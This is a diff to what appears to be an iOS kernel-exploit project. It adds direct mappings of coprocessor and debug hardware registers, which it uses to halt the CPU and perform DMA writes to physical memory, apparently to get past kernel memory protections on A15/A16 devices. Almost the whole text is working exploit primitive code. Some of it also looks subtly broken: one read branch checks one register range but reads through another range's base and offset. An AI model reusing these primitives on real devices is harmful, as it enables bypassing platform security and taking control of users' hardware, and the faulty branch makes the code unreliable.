@@ -5,13 +5,8 @@
 //  Created by Lars Fröder on 29.12.23.
 //
 
-#import <Foundation/Foundation.h>
-#import <dlfcn.h>
-#import <mach-o/dyld.h>
-#import <sys/sysctl.h>
-#include "IOSurface_Primitives.h"
-#include "libkfd.h"
 #include "kfd_meow-Swift.h"
+#include "pplrw.h"
 
 struct shit_map {
     uint64_t pa;
@@ -19,9 +14,21 @@ struct shit_map {
 };
 
 bool isa15a16 = false;
+uint64_t base6040000 = 0;
+uint64_t base6140000 = 0;
+uint64_t base6150000 = 0;
+
+uint64_t base6040000_bak = 0;
 
 #define CACHED_MAP_LEN 20
 struct shit_map gCachedMap[CACHED_MAP_LEN];
+
+void mapping(void)
+{
+    base6040000 = (uint64_t)IOSurface_map(0x206040000,0x100);
+    base6140000 = (uint64_t)IOSurface_map(0x206140000,0x200);
+    base6150000 = (uint64_t)IOSurface_map(0x206150000,0x100);
+}
 
 void addMapping(uint64_t addr)
 {
@@ -40,26 +47,42 @@ void addMapping(uint64_t addr)
 
 void physwrite64_mapped(uint64_t addr, uint64_t val)
 {
-    addMapping(addr);
-
-    for (int i = 0; i < CACHED_MAP_LEN; i++) {
-        uint64_t page = addr & ~PAGE_MASK;
-        uint64_t off = addr & PAGE_MASK;
-        if (gCachedMap[i].pa == page) {
-            *(uint64_t *)(gCachedMap[i].map + off) = val;
+    if(isa15a16 && isAvailable() >= 8 && addr >= 0x206040000 && addr - 0x206040000 <= 0x100) {
+        *(uint64_t *)(base6040000 + addr - 0x206040000) = val;
+    } else if(isa15a16 && isAvailable() >= 8 && addr >= 0x206140000 && addr - 0x206140000 <= 0x200) {
+        *(uint64_t *)(base6140000 + addr - 0x206140000) = val;
+    } else if(isa15a16 && isAvailable() >= 8 && addr >= 0x206150000 && addr - 0x206150000 <= 0x100) {
+        *(uint64_t *)(base6150000 + addr - 0x206150000) = val;
+    } else {
+        addMapping(addr);
+        
+        for (int i = 0; i < CACHED_MAP_LEN; i++) {
+            uint64_t page = addr & ~PAGE_MASK;
+            uint64_t off = addr & PAGE_MASK;
+            if (gCachedMap[i].pa == page) {
+                *(uint64_t *)(gCachedMap[i].map + off) = val;
+            }
         }
     }
 }
 
 uint64_t physread64_mapped(uint64_t addr)
 {
-    addMapping(addr);
-
-    for (int i = 0; i < CACHED_MAP_LEN; i++) {
-        uint64_t page = addr & ~PAGE_MASK;
-        uint64_t off = addr & PAGE_MASK;
-        if (gCachedMap[i].pa == page) {
-            return *(uint64_t *)(gCachedMap[i].map + off);
+    if(isa15a16 && isAvailable() >= 8 && addr >= 0x206040000 && addr - 0x206040000 <= 0x200) {
+        return *(uint64_t *)(base6140000 + addr - 0x206140000);
+    } else if(isa15a16 && isAvailable() >= 8 && addr >= 0x206140000 && addr - 0x206140000 <= 0x200) {
+        return *(uint64_t *)(base6140000 + addr - 0x206140000);
+    } else if(isa15a16 && isAvailable() >= 8 && addr >= 0x206150000 && addr - 0x206150000 <= 0x100) {
+        return *(uint64_t *)(base6150000 + addr - 0x206150000);
+    } else {
+        addMapping(addr);
+        
+        for (int i = 0; i < CACHED_MAP_LEN; i++) {
+            uint64_t page = addr & ~PAGE_MASK;
+            uint64_t off = addr & PAGE_MASK;
+            if (gCachedMap[i].pa == page) {
+                return *(uint64_t *)(gCachedMap[i].map + off);
+            }
         }
     }
     return 0;
@@ -67,27 +90,43 @@ uint64_t physread64_mapped(uint64_t addr)
 
 void physwrite32_mapped(uint64_t addr, uint32_t val)
 {
-    addMapping(addr);
-
-    for (int i = 0; i < CACHED_MAP_LEN; i++) {
-        uint64_t page = addr & ~PAGE_MASK;
-        uint64_t off = addr & PAGE_MASK;
-        if (gCachedMap[i].pa == page) {
-            *(uint32_t *)(gCachedMap[i].map + off) = val;
-            break;
+    if(isa15a16 && isAvailable() >= 8 && addr >= 0x206040000 && addr - 0x206040000 <= 0x100) {
+        *(uint32_t *)(base6040000 + addr - 0x206040000) = val;
+    } else if(isa15a16 && isAvailable() >= 8 && addr >= 0x206140000 && addr - 0x206140000 <= 0x200) {
+        *(uint32_t *)(base6140000 + addr - 0x206140000) = val;
+    } else if(isa15a16 && isAvailable() >= 8 && addr >= 0x206150000 && addr - 0x206150000 <= 0x100) {
+        *(uint32_t *)(base6150000 + addr - 0x206150000) = val;
+    } else {
+        addMapping(addr);
+        
+        for (int i = 0; i < CACHED_MAP_LEN; i++) {
+            uint64_t page = addr & ~PAGE_MASK;
+            uint64_t off = addr & PAGE_MASK;
+            if (gCachedMap[i].pa == page) {
+                *(uint32_t *)(gCachedMap[i].map + off) = val;
+                break;
+            }
         }
     }
 }
 
 uint32_t physread32_mapped(uint64_t addr)
 {
-    addMapping(addr);
-
-    for (int i = 0; i < CACHED_MAP_LEN; i++) {
-        uint64_t page = addr & ~PAGE_MASK;
-        uint64_t off = addr & PAGE_MASK;
-        if (gCachedMap[i].pa == page) {
-            return *(uint32_t *)(gCachedMap[i].map + off);
+    if(isa15a16 && isAvailable() >= 8 && addr >= 0x206040000 && addr - 0x206040000 <= 0x100) {
+        return *(uint32_t *)(base6040000 + addr - 0x206040000);
+    } else if(isa15a16 && isAvailable() >= 8 && addr >= 0x206140000 && addr - 0x206140000 <= 0x200) {
+        return *(uint32_t *)(base6140000 + addr - 0x206140000);
+    } else if(isa15a16 && isAvailable() >= 8 && addr >= 0x206150000 && addr - 0x206150000 <= 0x100) {
+        return *(uint32_t *)(base6150000 + addr - 0x206150000);
+    } else {
+        addMapping(addr);
+        
+        for (int i = 0; i < CACHED_MAP_LEN; i++) {
+            uint64_t page = addr & ~PAGE_MASK;
+            uint64_t off = addr & PAGE_MASK;
+            if (gCachedMap[i].pa == page) {
+                return *(uint32_t *)(gCachedMap[i].map + off);
+            }
         }
     }
     return 0;
@@ -98,8 +137,12 @@ void ml_dbgwrap_halt_cpu(void)
     if ((physread64_mapped(0x206040000) & 0x90000000) != 0) {
         return;
     }
-
-    physwrite64_mapped(0x206040000, physread64_mapped(0x206040000) | (1 << 31));
+    
+    if(isa15a16 && isAvailable() >= 8) {
+        physwrite64_mapped(0x206040000, base6040000_bak | (1 << 31));
+    } else {
+        physwrite64_mapped(0x206040000, physread64_mapped(0x206040000) | (1 << 31));
+    }
 
     while ((physread64_mapped(0x206040000) & 0x10000000) == 0) { }
 }
@@ -316,7 +359,6 @@ void dma_writephys512(uint64_t targetPA, uint64_t *value)
     dma_done(orig);
 }
 
-#define min(a,b) (((a)<(b))?(a):(b))
 void dma_writephysbuf(uint64_t pa, const void *input, size_t size)
 {
     size_t sizeLeft = size;
@@ -406,18 +448,33 @@ void dma_writevirt8(uint64_t pa, uint8_t val)
 
 void dma_perform(void (^block)(void))
 {
+    mapping();
     gfx_power_init();
     if(isa15a16) {
-        physwrite64_mapped(0x206150020, 1);
+        if(isAvailable() >= 8) {
+            uint64_t base6150020 = base6150000 + 0x20;
+            *(uint64_t *)base6150020 = 1;
+            char buf[sizeof(uint64_t)] = {
+                *(uint64_t *)(base6150020),
+            };
+            hexdump(buf, sizeof(buf));
+            base6040000_bak = physread64_mapped(0x206040000);
+        } else {
+            physwrite64_mapped(0x206150020, 1);
+        }
     }
-    
     ml_dbgwrap_halt_cpu();
     
     block();
     
     ml_dbgwrap_unhalt_cpu();
     if(isa15a16) {
-        physwrite64_mapped(0x206150020, 0);
+        if(isAvailable() >= 8) {
+            uint64_t base6150020 = base6150000 + 0x20;
+            *(uint64_t *)base6150020 = 0;
+        } else {
+            physwrite64_mapped(0x206150020, 0);
+        }
     }
 }
 
